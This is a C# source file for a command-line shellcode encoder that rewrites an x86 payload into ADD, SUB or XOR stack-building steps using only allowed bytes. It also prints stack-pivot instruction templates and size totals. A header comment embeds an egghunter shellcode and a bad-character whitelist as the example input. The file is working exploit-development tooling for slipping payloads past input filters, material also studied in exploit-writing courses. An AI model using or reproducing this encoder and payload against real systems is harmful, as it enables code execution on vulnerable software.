using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using asm.encoder.Encoders;

namespace asm.encoder
{
    /* CLI Example:
     -source \x00\x00\x00\x00 
     -target \x90\x90\x90\x90\x90\x90\x90\x90\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x70\x65\x65\x70\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7 
     -allowed \x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3b\x3c\x3d\x3e\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f 
     -add 
     -sub 
     -xor
     * */


    class Program
    {
        const string AddFlag = "-add";
        const string SubFlag = "-sub";
        const string XorFlag = "-xor";
        const string SourceFlag = "-source";
        const string TargetFlag = "-target";
        const string AllowedFlag = "-allowed";
        const string TestFlag = "-test";

        static void UnitTest(string[] args)
        {
            byte[] allowedBytes = args[5].Split(new string[] { "\\x" }, StringSplitOptions.RemoveEmptyEntries).Select(b => byte.Parse(b, System.Globalization.NumberStyles.HexNumber)).ToArray();
            bool useAddEncoder = args.Any(a => string.Equals(a, AddFlag, StringComparison.OrdinalIgnoreCase));
            bool useSubEncoder = args.Any(a => string.Equals(a, SubFlag, StringComparison.OrdinalIgnoreCase));
            bool useXorEncoder = args.Any(a => string.Equals(a, XorFlag, StringComparison.OrdinalIgnoreCase));

            BaseEncoder addSubEncoder = null;
            BaseEncoder xorEncoder = null;

            if (useAddEncoder || useSubEncoder)
            {
                addSubEncoder = new AddSubEncoder(allowedBytes);
            }
            if (useXorEncoder)
            {
                xorEncoder = new XorEncoder(allowedBytes);
            }

            Random random = new Random();
            long counter = 0;

            while (true)
            {
                OpCode source = new OpCode((uint)random.Next());
                OpCode target = new OpCode((uint)random.Next());

                AsmEncoding addEncoding = null;
                AsmEncoding subEncoding = null;
                AsmEncoding xorEncoding = null;

                if (useAddEncoder)
                {
                    addEncoding = addSubEncoder.EncodeOperation(source, target, Operation.ADD);
                    System.Diagnostics.Debug.Assert(addEncoding.Intermediate.Code == addEncoding.Target.Code);
                }
                if (useSubEncoder)
                {
                    subEncoding = addSubEncoder.EncodeOperation(source, target, Operation.SUB);
                    System.Diagnostics.Debug.Assert(subEncoding.Intermediate.Code == subEncoding.Target.Code);
                }
                if (useXorEncoder)
                {
                    xorEncoding = xorEncoder.EncodeOperation(source, target, Operation.XOR);
                    System.Diagnostics.Debug.Assert(xorEncoding.Intermediate.Code == xorEncoding.Target.Code);
                }

                counter++;

                if (counter % 1000 == 0)
                {
                    Console.WriteLine($"Completed {counter} iterations.");
                }
            }
        }

        static void ValidateArgs(string[] args)
        {
            string usageMessage = $"Usage: {nameof(asm.encoder)} -source <value> -target <value> -allowed <value> [-add | -sub | -xor]";
            string byteFormatMessage = $"<value> must be binary string format: \\x00\\x01\\x02";
            string sourceLengthMessage = $"-source <value> must be exactly 4 bytes";
            string targetLengthMessage = $"-target <value> must be a multiple of 4 bytes";

            if (args.Length < 7)
            {
                throw new ArgumentException(usageMessage);
            }

            if (!string.Equals(args[0], SourceFlag, StringComparison.OrdinalIgnoreCase))
            {
                throw new ArgumentException(usageMessage);
            }

            if (!string.Equals(args[2], TargetFlag, StringComparison.OrdinalIgnoreCase))
            {
                throw new ArgumentException(usageMessage);
            }

            if (!string.Equals(args[4], AllowedFlag, StringComparison.OrdinalIgnoreCase))
            {
                throw new ArgumentException(usageMessage);
            }

            for (int i = 6; (i < args.Length && i < 9); i++)
            {
                if (!(string.Equals(args[i], AddFlag, StringComparison.OrdinalIgnoreCase) ||
                      string.Equals(args[i], SubFlag, StringComparison.OrdinalIgnoreCase) ||
                      string.Equals(args[i], XorFlag, StringComparison.OrdinalIgnoreCase)))
                {
                    throw new ArgumentException(usageMessage);
                }
            }

            string sourceData = args[1];
            try
            {
                byte[] sourceByte = sourceData.Split(new string[] { "\\x" }, StringSplitOptions.RemoveEmptyEntries).Select(b => byte.Parse(b, System.Globalization.NumberStyles.HexNumber)).ToArray();

                if (sourceByte.Length != 4)
                {
                    throw new ArgumentException(sourceLengthMessage);
                }
            }
            catch (Exception)
            {
                throw new ArgumentException(byteFormatMessage);
            }

            string targetData = args[3];
            try 
            {
                byte[] targetByte = targetData.Split(new string[] { "\\x" }, StringSplitOptions.RemoveEmptyEntries).Select(b => byte.Parse(b, System.Globalization.NumberStyles.HexNumber)).ToArray();
                if (targetByte.Length % 4 != 0)
                {
                    throw new ArgumentException(targetLengthMessage);
                }
            }
            catch (Exception)
            {
                throw new ArgumentException(byteFormatMessage);
            }

            string allowedData = args[5];
            try
            {
                byte[] allowedByte = allowedData.Split(new string[] { "\\x" }, StringSplitOptions.RemoveEmptyEntries).Select(b => byte.Parse(b, System.Globalization.NumberStyles.HexNumber)).ToArray();
            }
            catch (Exception)
            {
                throw new ArgumentException(byteFormatMessage);
            }
        }

        static void SetupOption1()
        {
            Console.WriteLine($"{string.Empty.PadRight(20, '=')}{nameof(SetupOption1)}{string.Empty.PadRight(20, '=')}");
            Console.WriteLine($"{"54",-20}; PUSH ESP");
            Console.WriteLine($"POP <REG>");
            Console.WriteLine($"ADD <REG>, <STACK_SPACE>");
            Console.WriteLine($"PUSH <REG>");
            Console.WriteLine($"{"5C",-20}; POP ESP");
            Console.WriteLine($"{string.Empty.PadRight(20, '=')}{nameof(SetupOption1)}{string.Empty.PadRight(20, '=')}");
            Console.WriteLine(Environment.NewLine);
        }

        static void SetupOption2()
        {
            Console.WriteLine($"{string.Empty.PadRight(20, '=')}{nameof(SetupOption2)}{string.Empty.PadRight(20, '=')}");
            Console.WriteLine($"+0x03: POP <REG>");
            Console.WriteLine($"+0x02: PUSH <REG>");
            Console.WriteLine($"+0x01: {"C3",-20}; RETN");
            Console.WriteLine($"---->: {"E8F8FFFFFF",-20}; CALL 'POP <REG>'");
            Console.WriteLine($"+0x01: MOV ESP, <REG>");
            Console.WriteLine($"-0x03: ADD ESP, <STACK_SPACE>");
            Console.WriteLine($"{string.Empty.PadRight(20, '=')}{nameof(SetupOption2)}{string.Empty.PadRight(20, '=')}");
            Console.WriteLine(Environment.NewLine);
        }

        static void Main(string[] args)
        {
            Console.WriteLine($"Endian Format: {(BitConverter.IsLittleEndian ? "LITTLE ENDIAN" : "BIG ENDIAN")}");
            try
            {
                ValidateArgs(args);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return;
            }

#if DEBUG
            if (args[args.Length - 1] == TestFlag)
            {
                UnitTest(args);
            }
#endif

            SetupOption1();
            SetupOption2();

            byte[] sourceBytes = args[1].Split(new string[] { "\\x" }, StringSplitOptions.RemoveEmptyEntries).Select(b => byte.Parse(b, System.Globalization.NumberStyles.HexNumber)).ToArray();
            byte[] targetBytes = args[3].Split(new string[] { "\\x" }, StringSplitOptions.RemoveEmptyEntries).Select(b => byte.Parse(b, System.Globalization.NumberStyles.HexNumber)).ToArray();
            byte[] allowedBytes = args[5].Split(new string[] { "\\x" }, StringSplitOptions.RemoveEmptyEntries).Select(b => byte.Parse(b, System.Globalization.NumberStyles.HexNumber)).ToArray();
            bool useAddEncoder = args.Any(a => string.Equals(a, AddFlag, StringComparison.OrdinalIgnoreCase));
            bool useSubEncoder = args.Any(a => string.Equals(a, SubFlag, StringComparison.OrdinalIgnoreCase));
            bool useXorEncoder = args.Any(a => string.Equals(a, XorFlag, StringComparison.OrdinalIgnoreCase));

            BaseEncoder addSubEncoder = null;
            BaseEncoder xorEncoder = null;

            if (useAddEncoder || useSubEncoder)
            {
                addSubEncoder = new AddSubEncoder(allowedBytes);
            }
            if (useXorEncoder)
            {
                xorEncoder = new XorEncoder(allowedBytes);
            }

            int encodedSize = 0;
            OpCode source = new OpCode(BitConverter.ToUInt32(sourceBytes, 0));
            for (int i = targetBytes.Length - 4; i >= 0; i -= 4)
            {
                AsmEncoding addEncoding = null;
                AsmEncoding subEncoding = null;
                AsmEncoding xorEncoding = null;

                OpCode target = new OpCode(BitConverter.ToUInt32(targetBytes, i));

                if (useAddEncoder)
                {
                    addEncoding = addSubEncoder.EncodeOperation(source, target, Operation.ADD);
                }
                if (useSubEncoder)
                {
                    subEncoding = addSubEncoder.EncodeOperation(source, target, Operation.SUB);
                }
                if (useXorEncoder)
                {
                    xorEncoding = xorEncoder.EncodeOperation(source, target, Operation.XOR);
                }

                AsmEncoding result = addEncoding;
                if (subEncoding != null && (result == null || subEncoding.Transitions.Count < result.Transitions.Count))
                {
                    result = subEncoding;
                }
                if (xorEncoding != null && (result == null || xorEncoding.Transitions.Count < result.Transitions.Count))
                {
                    result = xorEncoding;
                }

                Console.WriteLine(result);
                encodedSize += (result.Transitions.Count * 5) + 1; // 5 bytes per encoding step; 1 byte for push
                source = target;
            }

            Console.WriteLine($"Total Size of Payload: {targetBytes.Length}: 0x{targetBytes.Length:X2}");
            Console.WriteLine($"Total Size of Encoded: {encodedSize}: 0x{encodedSize:X2}");
            Console.WriteLine($"Total stack space: {targetBytes.Length + encodedSize}: 0x{(targetBytes.Length + encodedSize):X2}");
        }

        static IEnumerable<byte> GetAllowedBytes()
        {
            for (byte b = 0; b < byte.MaxValue; b++)
            {
                if (!(b == 0x0 || b == 0xA || b == 0xD || b == 0x2E || b == 0x2F || b == 0x3A || b == 0x3F || b == 0x40 || b > 0x7F))
                {
                    yield return b;
                }
            }
        }
    }
}